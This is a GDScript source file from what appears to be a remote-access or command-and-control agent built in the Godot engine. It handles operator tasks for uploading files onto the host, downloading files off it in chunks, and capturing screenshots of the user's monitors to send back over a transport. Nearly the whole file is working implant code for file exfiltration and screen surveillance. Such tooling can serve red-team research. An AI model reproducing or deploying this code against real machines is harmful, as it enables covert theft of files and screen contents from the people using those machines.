extends Node

@export var file_tasks = {}

var transport
var time = 0
var time_period = 1

var FileTransfer = preload("res://file_transfer.gd")

func _ready():
	transport = $".".get_parent().get_parent().get_node("transport")
	file_tasks = {}


func _on_tasking_upload(transport, task):

	if task.has("command") and task.get("command") == "upload" and task.has("parameters"):
		var task_id = task.get("id")
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		
		print("parameters: ", parameters)

		print("download the following")
		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("remote_path"), FileTransfer.DIRECTION.UPLOAD, transport, parameters.get("file"))
		print(parameters.get("remote_path"))
		print("")
	else:
		print("bad download task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_download(transport, task):
	
	print("\n\n______________________________________________________")
	print("_on_tasking_download(", task, ")")
	print("______________________________________________________\n\n")

	if task.has("command") and task.get("command") == "download" and task.has("parameters"):
		var task_id = task.get("id")
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()

		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("file_path"), FileTransfer.DIRECTION.DOWNLOAD, transport)
	else:
		print("bad upload task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_screenshot(transport, task):
	print("\n\n______________________________________________________")
	print("_on_tasking_screenshot(",task,")")
	print("______________________________________________________\n\n")

	if task.has("command") and task.get("command") == "screenshot" and task.has("parameters"):
		var task_id = task.get("id")
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()

		var screenshot = DisplayServer.screen_get_image(parameters.get("index"))
		
		if screenshot == null:
			transport.send(
				transport.create_task_response(
					false,
					true,
					task.get("id"),
					"Failed to locate screen %s" % [parameters.get("index")]
				)
			)
		else:
			var raw_data = screenshot.save_png_to_buffer()
			var file_path = "/screenshot/monitor_%s.png" % [parameters.get("index")]

			# TODO: for from_screen in range(DisplayServer.get_screen_count()): ?
			file_tasks[task_id] = FileTransfer.new(task_id, file_path, FileTransfer.DIRECTION.SCREENSHOT, transport, "", raw_data, true)
	else:
		print("bad screenshot task: ", task)
		# TODO: agent_response in failure cases

func on_tasking_download_buffer(transport, task_id, url, output, raw_data):
	if raw_data == null:
		transport.send(
			transport.create_task_response(
				false,
				true,
				task_id,
				output
			)
		)
	else:
		var file_path = "/buffer/%s.body" % url.validate_filename()

		# TODO: for from_screen in range(DisplayServer.get_screen_count()): ?
		file_tasks[task_id] = FileTransfer.new(task_id, file_path, FileTransfer.DIRECTION.DOWNLOAD, transport, "", raw_data, false)
		$".".get_parent().task_id_to_last_action[task_id] = "download"

func _process(delta):
	time += delta

	if time > time_period:
		time = 0

		for task_id in file_tasks.keys():
			file_tasks[task_id].process()

			match file_tasks[task_id].state:
				FileTransfer.STATUS.ERROR:
					print("Failed to download: ")
					file_tasks[task_id].debug()
				FileTransfer.STATUS.BEGIN:
					pass
				FileTransfer.STATUS.TRANSFER:
					pass
				FileTransfer.STATUS.COMPLETE:
					print("File COMPLETE: ")
					file_tasks[task_id].debug()
					file_tasks[task_id].process_file_complete()
					file_tasks.erase(task_id)
				_:
					print("Unknown file : ", task_id, file_tasks[task_id])

func _on_tasking_download_start(response):
	print("_on_tasking_download_start: ", response)
	var task_id = response.get("task_id")
	var file_id = response.get("file_id")

	if file_tasks.has(task_id):
		file_tasks[task_id].process_download_chunk(file_id)
	else:
		print("oh snap, didn't find that download start task id: ", task_id)

func _on_tasking_download_chunk(response):
	print("_on_tasking_download_chunk: ", response)
	# TODO: implement resend logic if status is not success (and update tasking to allow that state to get here...)
	# roll active_file_handle.position back one chunk_size if position > 0
	var task_id = response.get("task_id")
	var file_id = response.get("file_id")
	var send_file_chunk = true

	if file_tasks.has(task_id):
		if response.get("stopped") == task_id:
			file_tasks[task_id].completed = true

		if response.get("status") != "success":
			if file_tasks[task_id].position > file_tasks[task_id].chunk_size:
				file_tasks[task_id].position = file_tasks[task_id].position - file_tasks[task_id].chunk_size
			else:
				file_tasks[task_id].position = 0
			
			file_tasks[task_id].file_handle.seek(file_tasks[task_id].position)

			if file_tasks[task_id].completed:
				send_file_chunk = false

		if file_tasks[task_id].completed:
			file_tasks[task_id].process_file_complete()
			send_file_chunk = false

		if send_file_chunk:
			file_tasks[task_id].process_download_chunk(file_id)
	else:
		print("oh snap, didn't find that download chunk task id: ", task_id)

func _on_tasking_upload_start(response):
	print("_on_tasking_upload_start: ", response)
	var task_id = response.get("task_id")
	var request_file_chunk = true

	if file_tasks.has(task_id):
		if response.get("stopped") == task_id:
			file_tasks[task_id].completed = true

		if response.get("status") != "success":
			if file_tasks[task_id].completed:
				request_file_chunk = false

		if file_tasks[task_id].completed:
			file_tasks[task_id].process_file_complete()
			request_file_chunk = false

		if request_file_chunk:
			file_tasks[task_id].process_upload_chunk(response)
	else:
		print("oh snap, didn't find that upload start task id: ", task_id)


func _on_tasking_upload_chunk(response):
	print("_on_tasking_upload_chunk: ", response)
	# TODO: implement resend logic if status is not success (and update tasking to allow that state to get here...)
	# roll active_file_handle.position back one chunk_size if position > 0
	var task_id = response.get("task_id")

	if file_tasks.has(task_id):
		file_tasks[task_id].process_upload_chunk(response)
	else:
		print("oh snap, didn't find that upload chunk task id: ", task_id)
